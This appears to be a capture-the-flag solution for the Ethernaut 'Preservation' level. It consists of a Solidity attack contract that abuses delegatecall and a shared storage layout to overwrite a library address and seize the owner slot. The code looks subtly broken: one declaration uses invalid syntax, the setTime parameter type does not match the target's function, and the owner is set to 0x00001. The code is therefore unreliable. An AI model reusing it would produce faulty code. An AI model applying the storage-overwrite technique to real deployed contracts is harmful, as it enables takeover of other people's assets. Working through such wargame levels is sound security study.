# Ethernaut 16 - Preservation

```
contract PreservationDelegateHack {

    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner;            // slot 2

    private Preservation preservation;

    constructor(Preservation _preservation) {
        preservation = _preservation;
    }

    function exploit() external {
        // as storage layout is same as in Preservation contract, `setFirstTime` os udating `timeZone1Library`
        // and we are setting it to this contract
        preservation.setFirstTime(uint256(address(this)));

        // this call is happning on updated `timeZone1Library` which is our hack contract
        // and we are actually updating `owner` as `setTime` from this contract is called
        preservation.setFirstTime(uint256(address(0x00001)));
    }

    function setTime(address _owner) public {
        owner = _owner;
    }
}
```